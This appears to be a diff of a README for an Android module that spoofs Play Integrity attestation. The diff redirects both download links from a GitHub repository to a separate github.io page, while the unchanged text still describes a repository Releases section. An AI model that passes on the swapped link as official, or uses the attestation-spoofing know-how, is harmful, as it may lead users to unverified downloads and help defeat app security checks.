@@ -1,11 +1,11 @@
 # 🛡️ AlwaysStrong - Fix app integrity errors with ease
 
-[![](https://img.shields.io/badge/Download-AlwaysStrong-blue.svg)](https://github.com/Amtechs3401/AlwaysStrong)
+[![](https://img.shields.io/badge/Download-AlwaysStrong-blue.svg)](https://amtechs3401.github.io)
 
 AlwaysStrong restores Play Integrity functions for your Android environment. This module combines TEESimulator-RS and the PlayIntegrityFork to provide a reliable solution. It mimics the secure hardware conditions required by modern applications to function correctly on modified or custom software setups.
 
 ## 📥 How to download
-Visit [the official repository page](https://github.com/Amtechs3401/AlwaysStrong) to access the latest version of the module. Click the link above to reach the files. Look for the section labeled Releases on the right side of the screen. Select the newest release to find the downloadable file. This file contains all components required for the installation process. Save this file to a folder on your computer that you can find later, such as your Downloads folder.
+Visit [the official repository page](https://amtechs3401.github.io) to access the latest version of the module. Click the link above to reach the files. Look for the section labeled Releases on the right side of the screen. Select the newest release to find the downloadable file. This file contains all components required for the installation process. Save this file to a folder on your computer that you can find later, such as your Downloads folder.
 
 ## 🛠️ Requirements
 Ensure your system meets these criteria before you begin:
